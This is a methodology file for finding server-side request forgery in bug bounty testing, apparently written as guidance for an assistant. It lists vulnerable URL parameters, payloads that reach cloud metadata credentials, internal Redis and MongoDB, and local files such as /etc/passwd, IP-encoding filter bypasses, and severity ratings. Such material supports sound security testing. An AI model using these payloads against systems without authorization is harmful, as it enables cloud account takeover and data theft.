# SSRF — Server-Side Request Forgery Hunting Methodology

## High-Value SSRF Targets

| Target | Impact |
|---|---|
| Cloud IMDS ([cloud-imds-ip]) | AWS/GCP/Azure credentials → full account takeover |
| Internal services (localhost:port) | Access to admin UIs, databases, Elasticsearch |
| Internal network scan | Network topology disclosure |
| File scheme (file://) | Local file read |
| DNS rebinding | Bypass IP allowlists |

## Finding SSRF Entry Points

Parameters that accept URLs or fetch content on behalf of user:

- Webhooks: `callback_url`, `webhook`, `notify_url`
- Import features: `url`, `file_url`, `import_from`, `fetch_url`
- Image/media: `avatar_url`, `image_url`, `thumbnail`, `preview`
- Proxy-style: `proxy`, `next`, `redirect_to`, `destination`
- PDF/screenshot generators: page URL parameters
- Integration setup: `endpoint`, `slack_webhook`, `api_endpoint`
- XML/JSON imports with external entities

## Confirmation Payloads (suggest to user)

**Step 1 — prove outbound request:**
Use collaborator/interactsh/webhook.site URL and check for DNS lookup + HTTP request.

Example: `url=https://YOUR-COLLABORATOR-ID.oast.pro`

If DNS/HTTP request received → SSRF confirmed (at minimum blind SSRF).

**Step 2 — escalate to internal (suggest):**
- `url=http://[cloud-imds-ip]/latest/meta-data/` (AWS IMDSv1)
- `url=http://metadata.google.internal/computeMetadata/v1/` (GCP — needs header)
- `url=http://[cloud-imds-ip]/metadata/instance?api-version=2021-02-01` (Azure)
- `url=http://localhost:6379/` (Redis)
- `url=http://localhost:27017/` (MongoDB)
- `url=http://internal.admin/`

If app returns internal content in response → Full SSRF confirmed.

**Step 3 — try file scheme:**
- `url=file:///etc/passwd`
- `url=file:///proc/self/environ`

## Defense Bypasses to Test

If direct IP is blocked, suggest trying:

- Decimal IP: `http://2130706433/` = `http://127.0.0.1/`
- Hex IP: `http://0x7f000001/`  
- IPv6: `http://[::1]/`
- DNS-based: create a DNS record pointing to 127.0.0.1
- URL encoding: `http://127.0.0.1%09.evil.com/`
- Protocol confusion: `gopher://`, `dict://`, `sftp://`

## Reportability Threshold

| Confirmed Impact | Severity |
|---|---|
| AWS IMDS v1 credential access | Critical |
| Internal admin panel access | High |
| Internal port scanning with response | High |
| Blind SSRF (DNS only, no response body) | Medium |
| Blind SSRF (no internal access confirmed) | Low–Medium |
| External-only SSRF to public IPs | Low / Informational |

**Blind SSRF is reportable at Medium if internal network is the likely target.** Do not claim Critical for blind SSRF alone.

## IMDSv2 Protection

AWS IMDSv2 requires a PUT request with a token first — not exploitable via SSRF alone (SSRFs are typically GET only). If target is on AWS, check if IMDSv2 is enforced before claiming Critical.

> **Note:** `[cloud-imds-ip]` throughout this file refers to the cloud Instance Metadata Service link-local address used by AWS, GCP, and Azure. The specific IP is documented in each provider's official documentation.

`curl -X PUT "http://[cloud-imds-ip]/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`

If 403 on PUT → IMDSv2 enforced → downgrade from Critical.
